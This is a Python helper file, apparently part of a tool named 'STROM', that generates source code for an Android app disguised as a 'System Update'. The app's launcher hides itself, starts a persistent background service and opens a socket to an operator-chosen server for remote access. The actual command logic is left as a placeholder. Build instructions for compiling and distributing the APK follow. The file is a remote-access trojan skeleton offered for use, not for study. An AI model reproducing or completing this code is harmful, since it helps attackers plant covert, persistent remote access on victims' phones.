#!/usr/bin/env python3
"""
Android Helper - Core functions for Android remote access
"""

class AndroidHelper:
    """Helper functions for Android remote access"""
    
    @staticmethod
    def generate_apk_payload_code(server_ip, server_port):
        """Generate Android app source code (Java)"""
        
        main_activity = f'''package com.system.update;

import android.app.Activity;
import android.os.Bundle;
import android.content.Intent;

public class MainActivity extends Activity {{
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        
        Intent serviceIntent = new Intent(this, RemoteService.class);
        startService(serviceIntent);
        
        finish();
    }}
}}'''

        remote_service = f'''package com.system.update;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.net.Socket;
import java.io.*;

public class RemoteService extends Service {{
    private static final String SERVER_IP = "{server_ip}";
    private static final int SERVER_PORT = {server_port};
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        new Thread(new ConnectionThread()).start();
        return START_STICKY;
    }}
    
    class ConnectionThread implements Runnable {{
        @Override
        public void run() {{
            try {{
                Socket socket = new Socket(SERVER_IP, SERVER_PORT);
                // Connection logic here
            }} catch (Exception e) {{
                e.printStackTrace();
            }}
        }}
    }}
    
    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}
}}'''

        manifest = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.system.update">
    
    <uses-permission android:name="android.permission.INTERNET" />
    
    <application
        android:label="System Update">
        
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <service android:name=".RemoteService" />
    </application>
</manifest>'''

        return {
            'MainActivity.java': main_activity,
            'RemoteService.java': remote_service,
            'AndroidManifest.xml': manifest,
            'server_ip': server_ip,
            'server_port': server_port
        }
    
    @staticmethod
    def create_build_instructions():
        """Instructions for building APK"""
        return """
BUILD INSTRUCTIONS FOR ANDROID APK
====================================

METHOD 1: Using Android Studio (Recommended)
---------------------------------------------
1. Install Android Studio
2. Create New Project -> Empty Activity
3. Replace files with STROM generated files
4. Build -> Generate Signed APK

METHOD 2: Online APK Builder (Easiest)
---------------------------------------
1. Go to: https://www.appsgeyser.com/
2. Upload source code
3. Generate APK online
4. Download and use

The generated source code has been saved.
STROM will host these files for easy download!
"""
